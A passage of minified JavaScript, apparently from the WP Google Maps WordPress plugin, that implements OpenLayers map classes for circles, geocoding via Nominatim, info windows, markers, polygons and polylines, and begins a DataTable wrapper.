ol.layer.Vector({source:new ol.source.Vector,style:this.olStyle}),o?this.olFeature=o:this.recreate()},WPGMZA.OLCircle.prototype=Object.create(t.prototype),WPGMZA.OLCircle.prototype.constructor=WPGMZA.OLCircle,WPGMZA.OLCircle.prototype.recreate=function(){if(this.olFeature&&(this.layer.getSource().removeFeature(this.olFeature),delete this.olFeature),this.center&&this.radius){var e,t,o=1e3*parseFloat(this.radius)/2;e=this.center.lng,t=this.center.lat;var n=ol.geom.Polygon.circular([e,t],o,64).clone().transform("EPSG:4326","EPSG:3857");this.olFeature=new ol.Feature(n),this.layer.getSource().addFeature(this.olFeature)}},WPGMZA.OLCircle.prototype.getStyleFromSettings=function(){var e={};return this.opacity&&(e.fill=new ol.style.Fill({color:WPGMZA.hexOpacityToRGBA(this.fillColor,this.opacity)})),e},WPGMZA.OLCircle.prototype.updateStyleFromSettings=function(){var e=this.getStyleFromSettings();this.olStyle=new ol.style.Style(e),this.layer.setStyle(this.olStyle)},WPGMZA.OLCircle.prototype.setVisible=function(e){this.layer.setVisible(!!e)},WPGMZA.OLCircle.prototype.setCenter=function(e){WPGMZA.Circle.prototype.setCenter.apply(this,arguments),this.recreate()},WPGMZA.OLCircle.prototype.setRadius=function(e){WPGMZA.Circle.prototype.setRadius.apply(this,arguments),this.recreate()}})),jQuery((function(e){WPGMZA.OLGeocoder=function(){},WPGMZA.OLGeocoder.prototype=Object.create(WPGMZA.Geocoder.prototype),WPGMZA.OLGeocoder.prototype.constructor=WPGMZA.OLGeocoder,WPGMZA.OLGeocoder.prototype.getResponseFromCache=function(e,t){WPGMZA.restAPI.call("/geocode-cache",{data:{query:JSON.stringify(e)},success:function(e,o,n){e.lng=e.lon,t(e)},useCompressedPathVariable:!0})},WPGMZA.OLGeocoder.prototype.getResponseFromNominatim=function(t,o){var n={q:t.address,format:"json"};t.componentRestrictions&&t.componentRestrictions.country&&(n.countrycodes=t.componentRestrictions.country),e.ajax("https://nominatim.openstreetmap.org/search/",{data:n,success:function(e,t,n){o(e)},error:function(e,t,n){o(null,WPGMZA.Geocoder.FAIL)}})},WPGMZA.OLGeocoder.prototype.cacheResponse=function(t,o){e.ajax(WPGMZA.ajaxurl,{data:{action:"wpgmza_store_nominatim_cache",query:JSON.stringify(t),response:JSON.stringify(o)},method:"POST"})},WPGMZA.OLGeocoder.prototype.clearCache=function(t){e.ajax(WPGMZA.ajaxurl,{data:{action:"wpgmza_clear_nominatim_cache"},method:"POST",success:function(e){t(e)}})},WPGMZA.OLGeocoder.prototype.getLatLngFromAddress=function(e,t){return WPGMZA.OLGeocoder.prototype.geocode(e,t)},WPGMZA.OLGeocoder.prototype.getAddressFromLatLng=function(e,t){return WPGMZA.OLGeocoder.prototype.geocode(e,t)},WPGMZA.OLGeocoder.prototype.geocode=function(t,o){var n=this;if(!t)throw new Error("Invalid options");if(WPGMZA.LatLng.REGEXP.test(t.address)){var a=WPGMZA.LatLng.fromString(t.address);o([{geometry:{location:a},latLng:a,lat:a.lat,lng:a.lng}],WPGMZA.Geocoder.SUCCESS)}else{var r,i;if(t.location&&(t.latLng=new WPGMZA.LatLng(t.location)),t.address)i=t.address,r=function(e,t){for(var n=0;n<e.length;n++)e[n].geometry={location:new WPGMZA.LatLng({lat:parseFloat(e[n].lat),lng:parseFloat(e[n].lon)})},e[n].latLng={lat:parseFloat(e[n].lat),lng:parseFloat(e[n].lon)},e[n].bounds=new WPGMZA.LatLngBounds(new WPGMZA.LatLng({lat:e[n].boundingbox[1],lng:e[n].boundingbox[2]}),new WPGMZA.LatLng({lat:e[n].boundingbox[0],lng:e[n].boundingbox[3]})),e[n].lng=e[n].lon;o(e,t)};else{if(!t.latLng)throw new Error("You must supply either a latLng or address");i=t.latLng.toString(),r=function(e,t){var n=e[0].display_name;o([n],t)}}var s={location:i,options:t};this.getResponseFromCache(s,(function(a){a.length?r(a,WPGMZA.Geocoder.SUCCESS):n.getResponseFromNominatim(e.extend(t,{address:i}),(function(e,t){t!=WPGMZA.Geocoder.FAIL?0!=e.length?(r(e,WPGMZA.Geocoder.SUCCESS),n.cacheResponse(s,e)):o([],WPGMZA.Geocoder.ZERO_RESULTS):o(null,WPGMZA.Geocoder.FAIL)}))}))}}})),jQuery((function(e){var t;WPGMZA.OLInfoWindow=function(o){var n=this;t.call(this,o),this.element=e("<div class='wpgmza-infowindow ol-info-window-container ol-info-window-plain'></div>")[0],e(this.element).on("click",".ol-info-window-close",(function(e){n.close()}))},t=WPGMZA.isProVersion()?WPGMZA.ProInfoWindow:WPGMZA.InfoWindow,WPGMZA.OLInfoWindow.prototype=Object.create(t.prototype),WPGMZA.OLInfoWindow.prototype.constructor=WPGMZA.OLInfoWindow,Object.defineProperty(WPGMZA.OLInfoWindow.prototype,"isPanIntoViewAllowed",{get:function(){return!0}}),WPGMZA.OLInfoWindow.prototype.open=function(o,n){var a=this,r=n.getPosition();if(!t.prototype.open.call(this,o,n))return!1;this.parent=o,this.overlay&&this.mapObject.map.olMap.removeOverlay(this.overlay),this.overlay=new ol.Overlay({element:this.element,stopEvent:!1}),this.overlay.setPosition(ol.proj.fromLonLat([r.lng,r.lat])),a.mapObject.map.olMap.addOverlay(this.overlay),e(this.element).show(),WPGMZA.OLMarker.renderMode==WPGMZA.OLMarker.RENDER_MODE_VECTOR_LAYER&&WPGMZA.getImageDimensions(n.getIcon(),(function(t){e(a.element).css({left:Math.round(t.width/2)+"px"})})),this.trigger("infowindowopen"),this.trigger("domready")},WPGMZA.OLInfoWindow.prototype.close=function(t){e(this.element).hide(),this.overlay&&(WPGMZA.InfoWindow.prototype.close.call(this),this.trigger("infowindowclose"),this.mapObject.map.olMap.removeOverlay(this.overlay),this.overlay=null)},WPGMZA.OLInfoWindow.prototype.setContent=function(t){e(this.element).html("<i class='fa fa-times ol-info-window-close' aria-hidden='true'></i>"+t)},WPGMZA.OLInfoWindow.prototype.setOptions=function(t){t.maxWidth&&e(this.element).css({"max-width":t.maxWidth+"px"})},WPGMZA.OLInfoWindow.prototype.onOpen=function(){var t=this,o=e(this.element).find("img"),n=o.length,a=0;if(WPGMZA.InfoWindow.prototype.onOpen.apply(this,arguments),this.isPanIntoViewAllowed){function r(t,o){var n=e(t)[0].getBoundingClientRect(),a=e(o)[0].getBoundingClientRect();return n.left>=a.left&&n.left<=a.right&&n.right<=a.right&&n.right>=a.left&&n.top>=a.top&&n.top<=a.bottom&&n.bottom<=a.bottom&&n.bottom>=a.top}function i(){var o=.45*-e(t.element).height();t.mapObject.map.animateNudge(0,o,t.mapObject.getPosition())}o.each((function(e,o){o.onload=function(){++a!=n||r(t.element,t.mapObject.map.element)||i()}})),0!=n||r(t.element,t.mapObject.map.element)||i()}}})),jQuery((function(e){var t;WPGMZA.OLMap=function(o,n){var a=this;t.call(this,o),this.setOptions(n);var r,i=this.settings.toOLViewOptions();e(this.element).html(""),this.olMap=new ol.Map({target:e(o)[0],layers:[this.getTileLayer()],view:new ol.View(i)}),this.olMap.getInteractions().forEach((function(e){e instanceof ol.interaction.DragPan?e.setActive("yes"!=a.settings.wpgmza_settings_map_draggable):e instanceof ol.interaction.DoubleClickZoom?e.setActive(!a.settings.wpgmza_settings_map_clickzoom):e instanceof ol.interaction.MouseWheelZoom&&e.setActive("yes"!=a.settings.wpgmza_settings_map_scroll)}),this),"greedy"!=this.settings.wpgmza_force_greedy_gestures&&"yes"!=this.settings.wpgmza_force_greedy_gestures&&(this.gestureOverlay=e("<div class='wpgmza-gesture-overlay'></div>"),this.gestureOverlayTimeoutID=null,WPGMZA.isTouchDevice()||(this.olMap.on("wheel",(function(e){if(!ol.events.condition.platformModifierKeyOnly(e))return a.showGestureOverlay(),e.originalEvent.preventDefault(),!1})),this.gestureOverlay.text(WPGMZA.localized_strings.use_ctrl_scroll_to_zoom))),this.olMap.getControls().forEach((function(e){e instanceof ol.control.Zoom&&"yes"==WPGMZA.settings.wpgmza_settings_map_zoom&&a.olMap.removeControl(e)}),this),"yes"!=WPGMZA.settings.wpgmza_settings_map_full_screen_control&&this.olMap.addControl(new ol.control.FullScreen),WPGMZA.OLMarker.renderMode==WPGMZA.OLMarker.RENDER_MODE_VECTOR_LAYER&&(this.markerLayer=new ol.layer.Vector({source:new ol.source.Vector({features:[]})}),this.olMap.addLayer(this.markerLayer),this.olMap.on("click",(function(e){var t=a.olMap.getFeaturesAtPixel(e.pixel);if(t&&t.length){var o=t[0].wpgmzaMarker;o&&(o.trigger("click"),o.trigger("select"))}}))),this.olMap.on("movestart",(function(e){a.isBeingDragged=!0})),this.olMap.on("moveend",(function(e){a.wrapLongitude(),a.isBeingDragged=!1,a.dispatchEvent("dragend"),a.onIdle()})),this.olMap.getView().on("change:resolution",(function(e){a.dispatchEvent("zoom_changed"),a.dispatchEvent("zoomchanged"),setTimeout((function(){a.onIdle()}),10)})),this.olMap.getView().on("change",(function(){a.onBoundsChanged()})),a.onBoundsChanged(),this.storeLocator&&(r=this.storeLocator.centerPointMarker)&&(this.olMap.addOverlay(r.overlay),r.setVisible(!1)),e(this.element).on("click contextmenu",(function(t){var o;t=t||window.event;var n=a.pixelsToLatLng(t.offsetX,t.offsetY);if("which"in t?o=3==t.which:"button"in t&&(o=2==t.button),1!=t.which&&1!=t.button){if(o)return a.onRightClick(t)}else{if(a.isBeingDragged)return;if(e(t.target).closest(".ol-marker").length)return;a.trigger({type:"click",latLng:n})}})),WPGMZA.isProVersion()||(this.trigger("init"),this.dispatchEvent("created"),WPGMZA.events.dispatchEvent({type:"mapcreated",map:this}),e(this.element).trigger("wpgooglemaps_loaded"))},t=WPGMZA.isProVersion()?WPGMZA.ProMap:WPGMZA.Map,WPGMZA.OLMap.prototype=Object.create(t.prototype),WPGMZA.OLMap.prototype.constructor=WPGMZA.OLMap,WPGMZA.OLMap.prototype.getTileLayer=function(){var e={};return WPGMZA.settings.tile_server_url&&(e.url=WPGMZA.settings.tile_server_url),new ol.layer.Tile({source:new ol.source.OSM(e)})},WPGMZA.OLMap.prototype.wrapLongitude=function(){var e=ol.proj.transform(this.olMap.getView().getCenter(),"EPSG:3857","EPSG:4326"),t={lat:e[1],lng:e[0]};-180<=t.lng&&t.lng<=180||(t.lng=t.lng-360*Math.floor(t.lng/360),180<t.lng&&(t.lng-=360),this.setCenter(t))},WPGMZA.OLMap.prototype.getCenter=function(){var e=ol.proj.toLonLat(this.olMap.getView().getCenter());return{lat:e[1],lng:e[0]}},WPGMZA.OLMap.prototype.setCenter=function(e){var t=this.olMap.getView();WPGMZA.Map.prototype.setCenter.call(this,e),t.setCenter(ol.proj.fromLonLat([e.lng,e.lat])),this.wrapLongitude(),this.onBoundsChanged()},WPGMZA.OLMap.prototype.getBounds=function(){var e=this.olMap.getView().calculateExtent(this.olMap.getSize()),t=new WPGMZA.LatLngBounds,o=ol.proj.toLonLat([e[0],e[1]]),n=ol.proj.toLonLat([e[2],e[3]]);return t.north=o[1],t.south=n[1],t.west=o[0],t.east=n[0],t},WPGMZA.OLMap.prototype.fitBounds=function(e,t){if(e instanceof WPGMZA.LatLng&&(e={lat:e.lat,lng:e.lng}),t instanceof WPGMZA.LatLng)t={lat:t.lat,lng:t.lng};else if(e instanceof WPGMZA.LatLngBounds){var o=e;e={lat:o.south,lng:o.west},t={lat:o.north,lng:o.east}}var n=this.olMap.getView(),a=ol.extent.boundingExtent([ol.proj.fromLonLat([parseFloat(e.lng),parseFloat(e.lat)]),ol.proj.fromLonLat([parseFloat(t.lng),parseFloat(t.lat)])]);n.fit(a,this.olMap.getSize())},WPGMZA.OLMap.prototype.panTo=function(e,t){var o=this.olMap.getView(),n={center:ol.proj.fromLonLat([parseFloat(e.lng),parseFloat(e.lat)]),duration:500};1<arguments.length&&(n.zoom=parseInt(t)),o.animate(n)},WPGMZA.OLMap.prototype.getZoom=function(){return Math.round(this.olMap.getView().getZoom())},WPGMZA.OLMap.prototype.setZoom=function(e){this.olMap.getView().setZoom(e)},WPGMZA.OLMap.prototype.getMinZoom=function(){return this.olMap.getView().getMinZoom()},WPGMZA.OLMap.prototype.setMinZoom=function(e){this.olMap.getView().setMinZoom(e)},WPGMZA.OLMap.prototype.getMaxZoom=function(){return this.olMap.getView().getMaxZoom()},WPGMZA.OLMap.prototype.setMaxZoom=function(e){this.olMap.getView().setMaxZoom(e)},WPGMZA.OLMap.prototype.setOptions=function(e){t.prototype.setOptions.call(this,e),this.olMap&&this.olMap.getView().setProperties(this.settings.toOLViewOptions())},WPGMZA.OLMap.prototype.addMarker=function(e){WPGMZA.OLMarker.renderMode==WPGMZA.OLMarker.RENDER_MODE_HTML_ELEMENT?this.olMap.addOverlay(e.overlay):(this.markerLayer.getSource().addFeature(e.feature),e.featureInSource=!0),t.prototype.addMarker.call(this,e)},WPGMZA.OLMap.prototype.removeMarker=function(e){WPGMZA.OLMarker.renderMode==WPGMZA.OLMarker.RENDER_MODE_HTML_ELEMENT?this.olMap.removeOverlay(e.overlay):(this.markerLayer.getSource().removeFeature(e.feature),e.featureInSource=!1),t.prototype.removeMarker.call(this,e)},WPGMZA.OLMap.prototype.addPolygon=function(e){this.olMap.addLayer(e.layer),t.prototype.addPolygon.call(this,e)},WPGMZA.OLMap.prototype.removePolygon=function(e){this.olMap.removeLayer(e.layer),t.prototype.removePolygon.call(this,e)},WPGMZA.OLMap.prototype.addPolyline=function(e){this.olMap.addLayer(e.layer),t.prototype.addPolyline.call(this,e)},WPGMZA.OLMap.prototype.removePolyline=function(e){this.olMap.removeLayer(e.layer),t.prototype.removePolyline.call(this,e)},WPGMZA.OLMap.prototype.addCircle=function(e){this.olMap.addLayer(e.layer),t.prototype.addCircle.call(this,e)},WPGMZA.OLMap.prototype.removeCircle=function(e){this.olMap.removeLayer(e.layer),t.prototype.removeCircle.call(this,e)},WPGMZA.OLMap.prototype.addRectangle=function(e){this.olMap.addLayer(e.layer),t.prototype.addRectangle.call(this,e)},WPGMZA.OLMap.prototype.removeRectangle=function(e){this.olMap.removeLayer(e.layer),t.prototype.removeRectangle.call(this,e)},WPGMZA.OLMap.prototype.pixelsToLatLng=function(e,t){null==t&&("x"in e&&"y"in e?(t=e.y,e=e.x):console.warn("Y coordinate undefined in pixelsToLatLng (did you mean to pass 2 arguments?)"));var o=this.olMap.getCoordinateFromPixel([e,t]);if(!o)return{x:null,y:null};var n=ol.proj.toLonLat(o);return{lat:n[1],lng:n[0]}},WPGMZA.OLMap.prototype.latLngToPixels=function(e){var t=ol.proj.fromLonLat([e.lng,e.lat]),o=this.olMap.getPixelFromCoordinate(t);return o?{x:o[0],y:o[1]}:{x:null,y:null}},WPGMZA.OLMap.prototype.enableBicycleLayer=function(e){if(e)this.bicycleLayer||(this.bicycleLayer=new ol.layer.Tile({source:new ol.source.OSM({url:"http://{a-c}.tile.opencyclemap.org/cycle/{z}/{x}/{y}.png"})})),this.olMap.addLayer(this.bicycleLayer);else{if(!this.bicycleLayer)return;this.olMap.removeLayer(this.bicycleLayer)}},WPGMZA.OLMap.prototype.showGestureOverlay=function(){var t=this;clearTimeout(this.gestureOverlayTimeoutID),e(this.gestureOverlay).stop().animate({opacity:"100"}),e(this.element).append(this.gestureOverlay),e(this.gestureOverlay).css({"line-height":e(this.element).height()+"px",opacity:"1.0"}),e(this.gestureOverlay).show(),this.gestureOverlayTimeoutID=setTimeout((function(){t.gestureOverlay.fadeOut(2e3)}),2e3)},WPGMZA.OLMap.prototype.onElementResized=function(e){this.olMap.updateSize()},WPGMZA.OLMap.prototype.onRightClick=function(t){if(e(t.target).closest(".ol-marker, .wpgmza_modern_infowindow, .wpgmza-modern-store-locator").length)return!0;var o=e(this.element).offset(),n=t.pageX-o.left,a=t.pageY-o.top,r=this.pixelsToLatLng(n,a);return this.trigger({type:"rightclick",latLng:r}),e(this.element).trigger({type:"rightclick",latLng:r}),t.preventDefault(),!1},WPGMZA.OLMap.prototype.enableAllInteractions=function(){this.olMap.getInteractions().forEach((function(e){(e instanceof ol.interaction.DragPan||e instanceof ol.interaction.DoubleClickZoom||e instanceof ol.interaction.MouseWheelZoom)&&e.setActive(!0)}),this)}})),jQuery((function(e){var t;WPGMZA.OLMarker=function(o){var n=this;t.call(this,o);var a=ol.proj.fromLonLat([parseFloat(this.lng),parseFloat(this.lat)]);if(WPGMZA.OLMarker.renderMode==WPGMZA.OLMarker.RENDER_MODE_HTML_ELEMENT){var r=e("<img alt=''/>")[0];r.onload=function(e){n.updateElementHeight(),n.map&&n.map.olMap.updateSize()},r.src=WPGMZA.defaultMarkerIcon,this.element=e("<div class='ol-marker'></div>")[0],e(this.element).attr("title",this.title),this.element.appendChild(r),this.element.wpgmzaMarker=this,e(this.element).on("mouseover",(function(e){n.dispatchEvent("mouseover")})),this.overlay=new ol.Overlay({element:this.element,position:a,positioning:"bottom-center",stopEvent:!1}),this.overlay.setPosition(a),this.animation&&this.setAnimation(this.animation),this.setLabel(this.settings.label),o&&o.draggable&&this.setDraggable(!0),this.rebindClickListener()}else{if(WPGMZA.OLMarker.renderMode!=WPGMZA.OLMarker.RENDER_MODE_VECTOR_LAYER)throw new Error("Invalid marker render mode");this.feature=new ol.Feature({geometry:new ol.geom.Point(a)}),this.feature.setStyle(this.getVectorLayerStyle()),this.feature.wpgmzaMarker=this}this.trigger("init")},t=WPGMZA.isProVersion()?WPGMZA.ProMarker:WPGMZA.Marker,WPGMZA.OLMarker.prototype=Object.create(t.prototype),WPGMZA.OLMarker.prototype.constructor=WPGMZA.OLMarker,WPGMZA.OLMarker.RENDER_MODE_HTML_ELEMENT="element",WPGMZA.OLMarker.RENDER_MODE_VECTOR_LAYER="vector",WPGMZA.OLMarker.renderMode=WPGMZA.OLMarker.RENDER_MODE_HTML_ELEMENT,"open-layers"==WPGMZA.settings.engine&&WPGMZA.OLMarker.renderMode==WPGMZA.OLMarker.RENDER_MODE_VECTOR_LAYER&&(WPGMZA.OLMarker.defaultVectorLayerStyle=new ol.style.Style({image:new ol.style.Icon({anchor:[.5,1],src:WPGMZA.defaultMarkerIcon})}),WPGMZA.OLMarker.hiddenVectorLayerStyle=new ol.style.Style({})),WPGMZA.OLMarker.prototype.getVectorLayerStyle=function(){return this.vectorLayerStyle?this.vectorLayerStyle:WPGMZA.OLMarker.defaultVectorLayerStyle},WPGMZA.OLMarker.prototype.updateElementHeight=function(t,o){var n=this;0!=(t=t||e(this.element).find("img").height())||o||e(window).one("focus",(function(e){n.updateElementHeight(!1,!0)})),e(this.element).css({height:t+"px"})},WPGMZA.OLMarker.prototype.addLabel=function(){this.setLabel(this.getLabelText())},WPGMZA.OLMarker.prototype.setLabel=function(t){WPGMZA.OLMarker.renderMode!=WPGMZA.OLMarker.RENDER_MODE_VECTOR_LAYER?t?(this.label||(this.label=e("<div class='ol-marker-label'/>"),e(this.element).append(this.label)),this.label.html(t)):this.label&&e(this.element).find(".ol-marker-label").remove():console.warn("Marker labels are not currently supported in Vector Layer rendering mode")},WPGMZA.OLMarker.prototype.getVisible=function(e){if(WPGMZA.OLMarker.renderMode!=WPGMZA.OLMarker.RENDER_MODE_VECTOR_LAYER)return"none"!=this.overlay.getElement().style.display},WPGMZA.OLMarker.prototype.setVisible=function(e){if(t.prototype.setVisible.call(this,e),WPGMZA.OLMarker.renderMode==WPGMZA.OLMarker.RENDER_MODE_VECTOR_LAYER)if(e){var o=this.getVectorLayerStyle();this.feature.setStyle(o)}else this.feature.setStyle(null);else this.overlay.getElement().style.display=e?"block":"none"},WPGMZA.OLMarker.prototype.setPosition=function(e){t.prototype.setPosition.call(this,e);var o=ol.proj.fromLonLat([parseFloat(this.lng),parseFloat(this.lat)]);WPGMZA.OLMarker.renderMode==WPGMZA.OLMarker.RENDER_MODE_VECTOR_LAYER?this.feature.setGeometry(new ol.geom.Point(o)):this.overlay.setPosition(o)},WPGMZA.OLMarker.prototype.updateOffset=function(e,t){WPGMZA.OLMarker.renderMode!=WPGMZA.OLMarker.RENDER_MODE_VECTOR_LAYER?(e=this._offset.x,t=this._offset.y,this.element.style.position="relative",this.element.style.left=e+"px",this.element.style.top=t+"px"):console.warn("Marker offset is not currently supported in Vector Layer rendering mode")},WPGMZA.OLMarker.prototype.setAnimation=function(o){if(WPGMZA.OLMarker.renderMode!=WPGMZA.OLMarker.RENDER_MODE_VECTOR_LAYER)switch(t.prototype.setAnimation.call(this,o),o){case WPGMZA.Marker.ANIMATION_NONE:e(this.element).removeAttr("data-anim");break;case WPGMZA.Marker.ANIMATION_BOUNCE:e(this.element).attr("data-anim","bounce");break;case WPGMZA.Marker.ANIMATION_DROP:e(this.element).attr("data-anim","drop")}else console.warn("Marker animation is not currently supported in Vector Layer rendering mode")},WPGMZA.OLMarker.prototype.setDraggable=function(t){var o=this;if(WPGMZA.OLMarker.renderMode!=WPGMZA.OLMarker.RENDER_MODE_VECTOR_LAYER)if(t){var n={disabled:!1};this.jQueryDraggableInitialized||(n.start=function(e){o.onDragStart(e)},n.stop=function(e){o.onDragEnd(e)}),e(this.element).draggable(n),this.jQueryDraggableInitialized=!0,this.rebindClickListener()}else e(this.element).draggable({disabled:!0});else console.warn("Marker dragging is not currently supported in Vector Layer rendering mode")},WPGMZA.OLMarker.prototype.setOpacity=function(t){WPGMZA.OLMarker.renderMode!=WPGMZA.OLMarker.RENDER_MODE_VECTOR_LAYER?e(this.element).css({opacity:t}):console.warn("Marker opacity is not currently supported in Vector Layer rendering mode")},WPGMZA.OLMarker.prototype.onDragStart=function(e){this.isBeingDragged=!0,this.map.olMap.getInteractions().forEach((function(e){e instanceof ol.interaction.DragPan&&e.setActive(!1)}))},WPGMZA.OLMarker.prototype.onDragEnd=function(t){var o=parseFloat(e(this.element).css("top").match(/-?\d+/)[0]),n=parseFloat(e(this.element).css("left").match(/-?\d+/)[0]);e(this.element).css({top:"0px",left:"0px"});var a=this.getPosition(),r=this.map.latLngToPixels(a),i={x:r.x+n,y:r.y+o},s=this.map.pixelsToLatLng(i);this.setPosition(s),this.isBeingDragged=!1,this.trigger({type:"dragend",latLng:s}),"yes"!=this.map.settings.wpgmza_settings_map_draggable&&this.map.olMap.getInteractions().forEach((function(e){e instanceof ol.interaction.DragPan&&e.setActive(!0)}))},WPGMZA.OLMarker.prototype.onElementClick=function(e){var t=e.currentTarget.wpgmzaMarker;t.isBeingDragged||(t.dispatchEvent("click"),t.dispatchEvent("select"))},WPGMZA.OLMarker.prototype.rebindClickListener=function(){e(this.element).off("click",this.onElementClick),e(this.element).on("click",this.onElementClick)}})),jQuery((function(e){WPGMZA.OLModernStoreLocatorCircle=function(e,t){WPGMZA.ModernStoreLocatorCircle.call(this,e,t)},WPGMZA.OLModernStoreLocatorCircle.prototype=Object.create(WPGMZA.ModernStoreLocatorCircle.prototype),WPGMZA.OLModernStoreLocatorCircle.prototype.constructor=WPGMZA.OLModernStoreLocatorCircle,WPGMZA.OLModernStoreLocatorCircle.prototype.initCanvasLayer=function(){var t=this,o=e(this.map.element),n=o.children(".ol-viewport");this.canvas=document.createElement("canvas"),this.canvas.className="wpgmza-ol-canvas-overlay",o.append(this.canvas),this.renderFunction=function(o){t.canvas.width==n.width()&&t.canvas.height==n.height()||(t.canvas.width=n.width(),t.canvas.height=n.height(),e(this.canvas).css({width:n.width()+"px",height:n.height()+"px"})),t.draw()},this.map.olMap.on("postrender",this.renderFunction)},WPGMZA.OLModernStoreLocatorCircle.prototype.getContext=function(e){return this.canvas.getContext(e)},WPGMZA.OLModernStoreLocatorCircle.prototype.getCanvasDimensions=function(){return{width:this.canvas.width,height:this.canvas.height}},WPGMZA.OLModernStoreLocatorCircle.prototype.getCenterPixels=function(){return this.map.latLngToPixels(this.settings.center)},WPGMZA.OLModernStoreLocatorCircle.prototype.getWorldOriginOffset=function(){return{x:0,y:0}},WPGMZA.OLModernStoreLocatorCircle.prototype.getTransformedRadius=function(e){var t=new WPGMZA.LatLng(this.settings.center),o=new WPGMZA.LatLng(t);o.moveByDistance(e,90);var n=this.map.latLngToPixels(t),a=this.map.latLngToPixels(o);return Math.abs(a.x-n.x)},WPGMZA.OLModernStoreLocatorCircle.prototype.getScale=function(){return 1},WPGMZA.OLModernStoreLocatorCircle.prototype.destroy=function(){e(this.canvas).remove(),this.map.olMap.un("postrender",this.renderFunction),this.map=null,this.canvas=null}})),jQuery((function(e){WPGMZA.OLModernStoreLocator=function(t){WPGMZA.ModernStoreLocator.call(this,t),(WPGMZA.isProVersion()?e(".wpgmza_map[data-map-id='"+t+"']"):e("#wpgmza_map")).append(this.element)},WPGMZA.OLModernStoreLocator.prototype=Object.create(WPGMZA.ModernStoreLocator),WPGMZA.OLModernStoreLocator.prototype.constructor=WPGMZA.OLModernStoreLocator})),jQuery((function(e){var t;WPGMZA.OLPolygon=function(e,o){if(t.call(this,e,o),this.olStyle=new ol.style.Style,o)this.olFeature=o;else{var n=[[]];if(e&&e.polydata){for(var a=this.parseGeometry(e.polydata),r=0;r<a.length;r++)n[0].push(ol.proj.fromLonLat([parseFloat(a[r].lng),parseFloat(a[r].lat)]));this.olStyle=new ol.style.Style(this.getStyleFromSettings())}this.olFeature=new ol.Feature({geometry:new ol.geom.Polygon(n)})}this.layer=new ol.layer.Vector({source:new ol.source.Vector({features:[this.olFeature]}),style:this.olStyle}),this.layer.getSource().getFeatures()[0].setProperties({wpgmzaPolygon:this})},t=WPGMZA.isProVersion()?WPGMZA.ProPolygon:WPGMZA.Polygon,WPGMZA.OLPolygon.prototype=Object.create(t.prototype),WPGMZA.OLPolygon.prototype.constructor=WPGMZA.OLPolygon,WPGMZA.OLPolygon.prototype.getStyleFromSettings=function(){var e={};return this.linecolor&&this.lineopacity&&(e.stroke=new ol.style.Stroke({color:WPGMZA.hexOpacityToRGBA("#"+this.linecolor,this.lineopacity)})),this.opacity&&(e.fill=new ol.style.Fill({color:WPGMZA.hexOpacityToRGBA(this.fillcolor,this.opacity)})),e},WPGMZA.OLPolygon.prototype.updateStyleFromSettings=function(){var e=this.getStyleFromSettings();this.olStyle=new ol.style.Style(e),this.layer.setStyle(this.olStyle)},WPGMZA.OLPolygon.prototype.setEditable=function(e){},WPGMZA.OLPolygon.prototype.toJSON=function(){var e=t.prototype.toJSON.call(this),o=this.olFeature.getGeometry().getCoordinates()[0];e.points=[];for(var n=0;n<o.length;n++){var a=ol.proj.toLonLat(o[n]),r={lat:a[1],lng:a[0]};e.points.push(r)}return e}})),jQuery((function(e){var t;WPGMZA.OLPolyline=function(t,o){if(WPGMZA.Polyline.call(this,t),this.olStyle=new ol.style.Style,o)this.olFeature=o;else{var n=[];if(t&&(t.polydata||t.points)){var a;a=t.polydata?this.parseGeometry(t.polydata):t.points;for(var r=0;r<a.length;r++){if(!e.isNumeric(a[r].lat))throw new Error("Invalid latitude");if(!e.isNumeric(a[r].lng))throw new Error("Invalid longitude");n.push(ol.proj.fromLonLat([parseFloat(a[r].lng),parseFloat(a[r].lat)]))}}var i=this.getStyleFromSettings();this.olStyle=new ol.style.Style(i),this.olFeature=new ol.Feature({geometry:new ol.geom.LineString(n)})}this.layer=new ol.layer.Vector({source:new ol.source.Vector({features:[this.olFeature]}),style:this.olStyle}),this.layer.getSource().getFeatures()[0].setProperties({wpgmzaPolyline:this})},t=WPGMZA.Polyline,WPGMZA.OLPolyline.prototype=Object.create(t.prototype),WPGMZA.OLPolyline.prototype.constructor=WPGMZA.OLPolyline,WPGMZA.OLPolyline.prototype.getStyleFromSettings=function(){var e={};return this.settings.strokeOpacity&&(e.stroke=new ol.style.Stroke({color:WPGMZA.hexOpacityToRGBA(this.settings.strokeColor,this.settings.strokeOpacity),width:parseInt(this.settings.strokeWeight)})),e},WPGMZA.OLPolyline.prototype.updateStyleFromSettings=function(){var e=this.getStyleFromSettings();this.olStyle=new ol.style.Style(e),this.layer.setStyle(this.olStyle)},WPGMZA.OLPolyline.prototype.setEditable=function(e){},WPGMZA.OLPolyline.prototype.setPoints=function(e){this.olFeature&&this.layer.getSource().removeFeature(this.olFeature);for(var t=[],o=0;o<e.length;o++)t.push(ol.proj.fromLonLat([parseFloat(e[o].lng),parseFloat(e[o].lat)]));this.olFeature=new ol.Feature({geometry:new ol.geom.LineString(t)}),this.layer.getSource().addFeature(this.olFeature)},WPGMZA.OLPolyline.prototype.toJSON=function(){var e=t.prototype.toJSON.call(this),o=this.olFeature.getGeometry().getCoordinates();e.points=[];for(var n=0;n<o.length;n++){var a=ol.proj.toLonLat(o[n]),r={lat:a[1],lng:a[0]};e.points.push(r)}return e}})),jQuery((function(e){WPGMZA.OLText=function(){}})),jQuery((function(e){WPGMZA.DataTable=function(t){var o=this;if(!e.fn.dataTable)return console.warn("The dataTables library is not loaded. Cannot create a dataTable. Did you enable 'Do not enqueue dataTables'?"),void(WPGMZA.settings.wpgmza_do_not_enqueue_datatables&&WPGMZA.getCurrentPage()==WPGMZA.PAGE_MAP_EDIT&&alert("You have selected 'Do not enqueue DataTables' in WP Google Maps' settings. No 3rd party software is loading the DataTables library. Because of this, the marker table cannot load. Please uncheck this option to use the marker table."));if(e.fn.dataTable.ext)e.fn.dataTable.ext.errMode="throw";else{var n=e.fn.dataTable.version?e.fn.dataTable.version:"unknown";console.warn("You appear to be running an outdated or modified version of the dataTables library. This may cause issues with table functionality. This is usually caused by 3rd party software loading an older version of DataTables. The loaded version is "+n+", we recommend version 1.10.12 or above.")}this.element=t,(this.element.wpgmzaDataTable=this).dataTableElement=this.getDataTableElement();var 